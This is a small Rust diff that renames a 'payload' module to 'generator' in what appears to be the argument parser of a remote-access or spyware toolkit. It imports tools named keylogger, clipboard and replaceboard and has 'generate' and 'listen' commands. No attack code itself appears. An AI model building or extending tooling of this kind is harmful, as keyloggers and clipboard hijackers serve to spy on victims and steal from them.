@@ -1,4 +1,4 @@
-mod payload;
+mod generator;
 mod listener;
 mod tools;
 use tools::{ghost, keylogger, clipboard, replaceboard, mouseketool, Tool};
@@ -23,7 +23,7 @@ pub fn build(mut args: impl Iterator<Item = String>) -> Result<Tool, &'static st
     while let Some(arg) = args.next() {
         match arg.as_str() {
             "generate" => {
-                payload::generate();
+                generator::generate();
             }
             "listen" => {
                 listener::start();
